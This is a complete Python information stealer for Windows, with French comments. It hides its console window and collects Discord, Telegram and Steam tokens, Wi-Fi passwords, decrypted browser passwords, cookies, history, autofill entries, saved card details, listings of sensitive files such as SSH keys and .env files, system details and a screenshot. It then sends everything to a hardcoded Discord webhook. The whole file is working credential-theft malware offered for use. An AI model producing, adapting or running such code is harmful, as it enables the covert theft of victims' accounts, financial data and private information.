import os
import sys
import re
import json
import sqlite3
import shutil
import subprocess
import tempfile
import requests
import base64
import threading
import time
import ctypes
import winreg
import random
from pathlib import Path
from datetime import datetime
import platform
import getpass
import urllib.parse

# ============================================
# CONFIGURATION
# ============================================

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538524118796734566/siBYFEQXhjO3s9w9h4fE0KEg-n3tVfNw8MtySVjGhp23DzJIsXbOA1r2bFA__0bocJLR"  # Ton webhook

MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB

# ============================================
# FONCTIONS DE BASE
# ============================================

def hide_console():
    """Cache la console Windows"""
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_system_info():
    """Récupère toutes les infos système"""
    info = {
        'pc_name': platform.node(),
        'user': getpass.getuser(),
        'os': platform.system() + " " + platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'ip': 'N/A',
        'date': datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        'hardware': {},
        'drives': []
    }
    
    # IP publique
    try:
        info['ip'] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        pass
    
    # CPU
    try:
        cpu = subprocess.check_output('wmic cpu get name', shell=True, encoding='utf-8', errors='ignore')
        info['hardware']['cpu'] = cpu.split('\n')[1].strip() if len(cpu.split('\n')) > 1 else 'N/A'
    except:
        pass
    
    # RAM
    try:
        ram = subprocess.check_output('wmic computersystem get totalphysicalmemory', shell=True, encoding='utf-8', errors='ignore')
        ram_bytes = ram.split('\n')[1].strip() if len(ram.split('\n')) > 1 else '0'
        if ram_bytes:
            info['hardware']['ram'] = f"{int(ram_bytes)/1024/1024/1024:.2f} GB"
    except:
        pass
    
    # Disques
    try:
        output = subprocess.check_output('wmic logicaldisk where drivetype=3 get deviceid,size,freespace', shell=True, encoding='utf-8', errors='ignore')
        for line in output.split('\n')[1:]:
            if line.strip():
                parts = line.split()
                if len(parts) >= 3:
                    info['drives'].append({
                        'drive': parts[0],
                        'size': f"{int(parts[1])/1024/1024/1024:.2f} GB" if parts[1].isdigit() else 'N/A',
                        'free': f"{int(parts[2])/1024/1024/1024:.2f} GB" if parts[2].isdigit() else 'N/A'
                    })
    except:
        pass
    
    return info

# ============================================
# FONCTIONS D'EXTRACTION - TOKENS
# ============================================

def get_discord_tokens():
    """Extrait les tokens de toutes les apps Discord"""
    tokens = []
    apps = ['discord', 'discordcanary', 'discordptb', 'discorddevelopment']
    
    for app in apps:
        chemins = [
            os.path.expandvars(f'%APPDATA%\\{app}\\Local Storage\\leveldb'),
            os.path.expandvars(f'%LOCALAPPDATA%\\{app}\\Local Storage\\leveldb'),
        ]
        
        for chemin in chemins:
            if os.path.exists(chemin):
                try:
                    fichiers = [f for f in os.listdir(chemin) if f.endswith(('.log', '.ldb'))]
                    for fichier in fichiers:
                        with open(os.path.join(chemin, fichier), 'r', encoding='utf-8', errors='ignore') as f:
                            contenu = f.read()
                            pattern = r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}'
                            matches = re.findall(pattern, contenu)
                            for match in matches:
                                if match not in [t['token'] for t in tokens]:
                                    tokens.append({
                                        'app': app,
                                        'token': match
                                    })
                except:
                    continue
    
    return tokens

def get_other_tokens():
    """Extrait les tokens d'autres applications"""
    tokens = []
    
    # Telegram
    try:
        chemin = os.path.expandvars(r'%APPDATA%\Telegram Desktop\tdata')
        if os.path.exists(chemin):
            for root, dirs, files in os.walk(chemin):
                for file in files:
                    if file.endswith('.dat'):
                        try:
                            with open(os.path.join(root, file), 'rb') as f:
                                data = f.read()
                                # Recherche de patterns de tokens
                                pattern = rb'[a-zA-Z0-9_-]{35,}'
                                matches = re.findall(pattern, data)
                                for match in matches:
                                    try:
                                        token = match.decode('utf-8', errors='ignore')
                                        if len(token) > 20 and token not in [t['token'] for t in tokens]:
                                            tokens.append({
                                                'app': 'Telegram',
                                                'token': token
                                            })
                                    except:
                                        pass
                        except:
                            continue
    except:
        pass
    
    # Steam
    try:
        chemin = os.path.expandvars(r'%PROGRAMFILES(X86)%\Steam\config\loginusers.vdf')
        if os.path.exists(chemin):
            with open(chemin, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                pattern = r'"[0-9]{17}"'
                matches = re.findall(pattern, content)
                for match in matches:
                    tokens.append({
                        'app': 'Steam',
                        'token': match.replace('"', '')
                    })
    except:
        pass
    
    return tokens

# ============================================
# FONCTIONS D'EXTRACTION - MOTS DE PASSE WIFI
# ============================================

def get_wifi_passwords():
    """Extrait tous les mots de passe WiFi"""
    resultats = []
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], 
                                        encoding='utf-8', errors='ignore')
        profils = re.findall(r'Tous les profils utilisateur : (.*)', output)
        profils += re.findall(r'All User Profile\s*:\s*(.*)', output)
        
        for profil in profils:
            profil = profil.strip()
            try:
                cmd = ['netsh', 'wlan', 'show', 'profile', profil, 'key=clear']
                output2 = subprocess.check_output(cmd, encoding='utf-8', errors='ignore')
                mdp = re.search(r'Contenu de la clé\s*:\s*(.*)', output2)
                if not mdp:
                    mdp = re.search(r'Key Content\s*:\s*(.*)', output2)
                if mdp and mdp.group(1).strip():
                    resultats.append({
                        'ssid': profil,
                        'password': mdp.group(1).strip()
                    })
            except:
                continue
    except:
        pass
    return resultats

# ============================================
# FONCTIONS D'EXTRACTION - MOTS DE PASSE NAVIGATEUR
# ============================================

def get_browser_passwords_decrypted():
    """Extrait TOUS les mots de passe des navigateurs et les déchiffre"""
    resultats = []
    
    navigateurs = {
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data'),
        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data'),
        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Login Data'),
        'Vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default\Login Data'),
    }
    
    for browser, chemin in navigateurs.items():
        if os.path.exists(chemin):
            try:
                temp = os.path.join(tempfile.gettempdir(), f'{browser}_login.db')
                shutil.copy2(chemin, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    if row[0] or row[1]:
                        url = row[0] if row[0] else "URL inconnue"
                        username = row[1] if row[1] else "N/A"
                        encrypted_pass = row[2] if row[2] else None
                        
                        password = "[VIDE]"
                        if encrypted_pass:
                            try:
                                # Tentative de décryptage
                                import win32crypt
                                decrypted = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                                if decrypted:
                                    password = decrypted
                                else:
                                    password = "[VIDE]"
                            except:
                                password = "[CHIFFRÉ]"
                        
                        resultats.append({
                            'browser': browser,
                            'url': url,
                            'username': username,
                            'password': password
                        })
                conn.close()
                os.remove(temp)
            except Exception as e:
                continue
    
    return resultats

# ============================================
# FONCTIONS D'EXTRACTION - COOKIES
# ============================================

def get_browser_cookies():
    """Extrait TOUS les cookies"""
    resultats = []
    
    navigateurs = {
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies'),
        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies'),
    }
    
    for browser, chemin in navigateurs.items():
        if os.path.exists(chemin):
            try:
                temp = os.path.join(tempfile.gettempdir(), f'{browser}_cookies.db')
                shutil.copy2(chemin, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                try:
                    cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 50')
                    for row in cursor.fetchall():
                        if row[0]:
                            cookie_value = row[2] if row[2] else "[ENCRYPTED]"
                            resultats.append({
                                'browser': browser,
                                'host': row[0],
                                'name': row[1] if row[1] else 'N/A',
                                'value': cookie_value[:100] + '...' if len(cookie_value) > 100 else cookie_value
                            })
                except:
                    cursor.execute('SELECT host_key, name, value FROM cookies LIMIT 50')
                    for row in cursor.fetchall():
                        if row[0]:
                            resultats.append({
                                'browser': browser,
                                'host': row[0],
                                'name': row[1] if row[1] else 'N/A',
                                'value': row[2][:100] + '...' if len(row[2]) > 100 else row[2]
                            })
                conn.close()
                os.remove(temp)
            except:
                continue
    
    return resultats

# ============================================
# FONCTIONS D'EXTRACTION - HISTORIQUE
# ============================================

def get_browser_history():
    """Extrait l'historique complet"""
    historique = []
    
    navigateurs = {
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History'),
        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\History'),
    }
    
    for browser, chemin in navigateurs.items():
        if os.path.exists(chemin):
            try:
                temp = os.path.join(tempfile.gettempdir(), f'{browser}_history.db')
                shutil.copy2(chemin, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50')
                for row in cursor.fetchall():
                    if row[0]:
                        historique.append({
                            'browser': browser,
                            'url': row[0],
                            'title': row[1] if row[1] else 'N/A',
                            'visits': row[2] if row[2] else 0
                        })
                conn.close()
                os.remove(temp)
            except:
                continue
    
    return historique

# ============================================
# FONCTIONS D'EXTRACTION - DOWNLOADS
# ============================================

def get_browser_downloads():
    """Extrait l'historique des téléchargements"""
    downloads = []
    
    navigateurs = {
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History'),
    }
    
    for browser, chemin in navigateurs.items():
        if os.path.exists(chemin):
            try:
                temp = os.path.join(tempfile.gettempdir(), f'{browser}_downloads.db')
                shutil.copy2(chemin, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                try:
                    cursor.execute('SELECT target_path, referrer, site_url FROM downloads LIMIT 30')
                    for row in cursor.fetchall():
                        if row[0]:
                            downloads.append({
                                'browser': browser,
                                'path': row[0],
                                'referrer': row[1] if row[1] else 'N/A'
                            })
                except:
                    pass
                conn.close()
                os.remove(temp)
            except:
                continue
    
    return downloads

# ============================================
# FONCTIONS D'EXTRACTION - AUTOFILL
# ============================================

def get_browser_autofill():
    """Extrait les données d'autocomplete"""
    autofill = []
    
    navigateurs = {
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Web Data'),
    }
    
    for browser, chemin in navigateurs.items():
        if os.path.exists(chemin):
            try:
                temp = os.path.join(tempfile.gettempdir(), f'{browser}_autofill.db')
                shutil.copy2(chemin, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                try:
                    cursor.execute('SELECT name, value FROM autofill LIMIT 30')
                    for row in cursor.fetchall():
                        if row[0] and row[1]:
                            autofill.append({
                                'browser': browser,
                                'name': row[0],
                                'value': row[1]
                            })
                except:
                    pass
                conn.close()
                os.remove(temp)
            except:
                continue
    
    return autofill

# ============================================
# FONCTIONS D'EXTRACTION - CARTES BANCAIRES
# ============================================

def get_credit_cards():
    """Extrait les cartes de crédit enregistrées"""
    resultats = []
    
    navigateurs = {
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Web Data'),
    }
    
    for browser, chemin in navigateurs.items():
        if os.path.exists(chemin):
            try:
                temp = os.path.join(tempfile.gettempdir(), f'{browser}_cc.db')
                shutil.copy2(chemin, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                try:
                    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
                    for row in cursor.fetchall():
                        if row[0] or row[3]:
                            resultats.append({
                                'browser': browser,
                                'name': row[0] if row[0] else 'N/A',
                                'expiry': f"{row[1]}/{row[2]}" if row[1] and row[2] else 'N/A',
                                'encrypted': 'YES' if row[3] else 'NO'
                            })
                except:
                    pass
                conn.close()
                os.remove(temp)
            except:
                continue
    
    return resultats

# ============================================
# FONCTIONS D'EXTRACTION - FICHIERS
# ============================================

def scan_files():
    """Scanne TOUS les dossiers importants"""
    fichiers = []
    
    extensions = [
        '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
        '.odt', '.rtf', '.csv', '.json', '.xml', '.ini', '.cfg', '.conf',
        '.log', '.md', '.html', '.htm', '.css', '.js', '.py', '.java', '.cpp',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.svg',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
        '.vcf', '.pst', '.ost', '.db', '.sqlite', '.torrent',
        '.pem', '.crt', '.cer', '.key', '.pfx', '.p12',
        '.config', '.env', '.gitignore', '.npmrc', '.aws', '.ssh',
        '.wallet', '.dat', '.keychain'
    ]
    
    dossiers = [
        os.path.expandvars(r'%USERPROFILE%\Desktop'),
        os.path.expandvars(r'%USERPROFILE%\Documents'),
        os.path.expandvars(r'%USERPROFILE%\Downloads'),
        os.path.expandvars(r'%USERPROFILE%\Pictures'),
        os.path.expandvars(r'%USERPROFILE%\Videos'),
        os.path.expandvars(r'%USERPROFILE%\Music'),
        os.path.expandvars(r'%USERPROFILE%\Favorites'),
        os.path.expandvars(r'%USERPROFILE%\OneDrive'),
        os.path.expandvars(r'%USERPROFILE%\.ssh'),
        os.path.expandvars(r'%USERPROFILE%\AppData\Local\Temp'),
    ]
    
    for dossier in dossiers:
        if os.path.exists(dossier):
            try:
                for root, dirs, files in os.walk(dossier):
                    if len(fichiers) > 1000:
                        break
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in extensions):
                            try:
                                path = os.path.join(root, file)
                                size = os.path.getsize(path)
                                if size < MAX_FILE_SIZE:
                                    fichiers.append({
                                        'path': path,
                                        'name': file,
                                        'size': size,
                                        'modified': datetime.fromtimestamp(os.path.getmtime(path)).isoformat()
                                    })
                            except:
                                continue
            except:
                continue
    
    return fichiers

# ============================================
# FONCTIONS D'EXTRACTION - PROGRAMMES
# ============================================

def get_installed_programs():
    """Récupère tous les programmes installés"""
    resultats = []
    try:
        keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        ]
        for key_path in keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name:
                                version = ''
                                try:
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                except:
                                    pass
                                resultats.append({
                                    'name': name,
                                    'version': version
                                })
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
    except:
        pass
    return resultats

def get_startup_programs():
    """Récupère les programmes au démarrage"""
    resultats = []
    try:
        paths = [
            os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'),
            os.path.expandvars(r'%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup'),
        ]
        for path in paths:
            if os.path.exists(path):
                for item in os.listdir(path):
                    resultats.append(item)
    except:
        pass
    
    # Registre startup
    try:
        keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
        ]
        for key_path in keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                for i in range(winreg.QueryInfoKey(key)[1]):
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        resultats.append(f"{name}: {value}")
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
    except:
        pass
    
    return resultats

# ============================================
# FONCTIONS D'EXTRACTION - PROCESSUS
# ============================================

def get_running_processes():
    """Récupère les processus en cours"""
    resultats = []
    try:
        output = subprocess.check_output('tasklist /fo csv /nh', shell=True, encoding='utf-8', errors='ignore')
        lines = output.split('\n')
        for line in lines[:100]:
            if line.strip():
                parts = line.replace('"', '').split(',')
                if len(parts) >= 2:
                    resultats.append({
                        'name': parts[0],
                        'pid': parts[1]
                    })
    except:
        pass
    return resultats

# ============================================
# FONCTIONS D'EXTRACTION - RÉSEAU
# ============================================

def get_network_info():
    """Récupère les informations réseau"""
    resultats = {}
    try:
        output = subprocess.check_output('ipconfig /all', shell=True, encoding='utf-8', errors='ignore')
        resultats['ipconfig'] = output[:2000]
    except:
        pass
    
    try:
        output = subprocess.check_output('netstat -an', shell=True, encoding='utf-8', errors='ignore')
        resultats['netstat'] = output[:2000]
    except:
        pass
    
    return resultats

# ============================================
# SCREENSHOT
# ============================================

def take_screenshot():
    """Prend une capture d'écran"""
    try:
        import PIL.ImageGrab
        import io
        
        screenshot = PIL.ImageGrab.grab()
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return img_str
    except:
        return None

# ============================================
# ENVOI VERS LE WEBHOOK
# ============================================

def send_to_webhook(data):
    """Envoie toutes les données vers le webhook Discord"""
    
    embeds = []
    
    # ===== EMBED 1: SYSTÈME =====
    system_fields = [
        {"name": "🖥️ PC", "value": data['system']['pc_name'], "inline": True},
        {"name": "👤 User", "value": data['system']['user'], "inline": True},
        {"name": "🖥️ OS", "value": data['system']['os'], "inline": True},
        {"name": "🌐 IP", "value": data['system']['ip'], "inline": True},
        {"name": "📅 Date", "value": data['system']['date'], "inline": False},
    ]
    
    if data['system']['hardware'].get('cpu'):
        system_fields.append({"name": "💻 CPU", "value": data['system']['hardware']['cpu'], "inline": True})
    if data['system']['hardware'].get('ram'):
        system_fields.append({"name": "🧠 RAM", "value": data['system']['hardware']['ram'], "inline": True})
    
    if data['system']['drives']:
        drives_text = "\n".join([f"💾 {d['drive']}: {d['size']} (Libre: {d['free']})" for d in data['system']['drives']])
        system_fields.append({"name": "💾 Disques", "value": drives_text[:1000], "inline": False})
    
    embed1 = {
        "title": "🖥️ **INFORMATIONS SYSTÈME**",
        "color": 15158332,
        "fields": system_fields,
    }
    embeds.append(embed1)
    
    # ===== EMBED 2: TOKENS DISCORD =====
    if data['discord_tokens']:
        token_text = "\n".join([f"📌 **{t['app']}**: `{t['token']}`" for t in data['discord_tokens']])
        embed2 = {
            "title": f"🔑 **TOKENS DISCORD** ({len(data['discord_tokens'])})",
            "color": 3066993,
            "description": token_text[:2000],
        }
        embeds.append(embed2)
    
    # ===== EMBED 3: AUTRES TOKENS =====
    if data['other_tokens']:
        token_text = "\n".join([f"📌 **{t['app']}**: `{t['token']}`" for t in data['other_tokens'][:10]])
        embed3 = {
            "title": f"🔑 **AUTRES TOKENS** ({len(data['other_tokens'])})",
            "color": 3066993,
            "description": token_text[:2000],
        }
        embeds.append(embed3)
    
    # ===== EMBED 4: MOTS DE PASSE WIFI =====
    if data['wifi']:
        wifi_text = "\n".join([f"📡 **{w['ssid']}** → `{w['password']}`" for w in data['wifi']])
        embed4 = {
            "title": f"📶 **MOTS DE PASSE WIFI** ({len(data['wifi'])})",
            "color": 15844367,
            "description": wifi_text[:2000],
        }
        embeds.append(embed4)
    
    # ===== EMBED 5: MOTS DE PASSE NAVIGATEUR =====
    if data['browser_passwords']:
        pwd_text = "\n".join([f"🌐 **[{p['browser']}]** {p['url']}\n   👤 {p['username']}\n   🔑 `{p['password']}`" for p in data['browser_passwords'][:15]])
        embed5 = {
            "title": f"🔓 **MOTS DE PASSE NAVIGATEUR** ({len(data['browser_passwords'])})",
            "color": 3066993,
            "description": pwd_text[:2000],
        }
        embeds.append(embed5)
    
    # ===== EMBED 6: COOKIES =====
    if data['cookies']:
        cookies_text = "\n".join([f"🍪 **[{c['browser']}]** {c['host']} → {c['name']} = {c['value'][:50]}" for c in data['cookies'][:15]])
        embed6 = {
            "title": f"🍪 **COOKIES** ({len(data['cookies'])})",
            "color": 16776960,
            "description": cookies_text[:2000],
        }
        embeds.append(embed6)
    
    # ===== EMBED 7: HISTORIQUE =====
    if data['history']:
        hist_text = "\n".join([f"📖 **[{h['browser']}]** {h['url']} ({h['visits']} visites)" for h in data['history'][:15]])
        embed7 = {
            "title": f"📜 **HISTORIQUE** ({len(data['history'])})",
            "color": 16705372,
            "description": hist_text[:2000],
        }
        embeds.append(embed7)
    
    # ===== EMBED 8: CARTES BANCAIRES =====
    if data['credit_cards']:
        cc_text = "\n".join([f"💳 **[{c['browser']}]** {c['name']} → Exp: {c['expiry']} (Chiffré: {c['encrypted']})" for c in data['credit_cards'][:10]])
        embed8 = {
            "title": f"💳 **CARTES BANCAIRES** ({len(data['credit_cards'])})",
            "color": 16711680,
            "description": cc_text[:2000],
        }
        embeds.append(embed8)
    
    # ===== EMBED 9: FICHIERS =====
    if data['files']:
        files_text = "\n".join([f"📄 **{f['name']}** ({f['size']//1024} KB) - {f['modified'][:10]}" for f in data['files'][:15]])
        embed9 = {
            "title": f"📂 **FICHIERS** ({len(data['files'])})",
            "color": 15277667,
            "description": files_text[:2000],
        }
        embeds.append(embed9)
    
    # ===== EMBED 10: PROGRAMMES =====
    if data['programs']:
        progs_text = "\n".join([f"💻 **{p['name']}** (v{p['version']})" for p in data['programs'][:15] if p['name']])
        embed10 = {
            "title": f"📦 **PROGRAMMES** ({len(data['programs'])})",
            "color": 123456,
            "description": progs_text[:2000],
        }
        embeds.append(embed10)
    
    # ===== EMBED 11: SCREENSHOT =====
    if data['screenshot']:
        embed11 = {
            "title": "📸 **CAPTURE D'ÉCRAN**",
            "color": 15844367,
            "image": {"url": "attachment://screenshot.png"},
        }
        embeds.append(embed11)
    
    # Envoyer tous les embeds
    for i in range(0, len(embeds), 5):
        batch = embeds[i:i+5]
        
        if data['screenshot'] and i == len(embeds) - len(batch):
            files = {'file': ('screenshot.png', base64.b64decode(data['screenshot']), 'image/png')}
            payload = {
                "content": f"🚨 **RAPPORT ULTIME v2** 🚨" if i == 0 else "",
                "embeds": batch
            }
            try:
                requests.post(WEBHOOK_URL, json=payload, files=files, timeout=10)
            except:
                pass
        else:
            payload = {
                "content": f"🚨 **RAPPORT ULTIME v2** 🚨" if i == 0 else "",
                "embeds": batch
            }
            try:
                requests.post(WEBHOOK_URL, json=payload, timeout=10)
            except:
                pass
        
        time.sleep(0.5)

# ============================================
# MAIN
# ============================================

def main():
    # Cache la console
    hide_console()
    
    try:
        # Collecte des données
        data = {
            'system': get_system_info(),
            'discord_tokens': get_discord_tokens(),
            'other_tokens': get_other_tokens(),
            'wifi': get_wifi_passwords(),
            'browser_passwords': get_browser_passwords_decrypted(),
            'cookies': get_browser_cookies(),
            'history': get_browser_history(),
            'credit_cards': get_credit_cards(),
            'files': scan_files(),
            'programs': get_installed_programs(),
            'startup': get_startup_programs(),
            'processes': get_running_processes(),
            'network': get_network_info(),
            'screenshot': take_screenshot(),
        }
        
        # Envoi vers le webhook
        send_to_webhook(data)
        
    except Exception as e:
        # En cas d'erreur, on envoie quand même ce qu'on a
        pass

if __name__ == "__main__":
    main()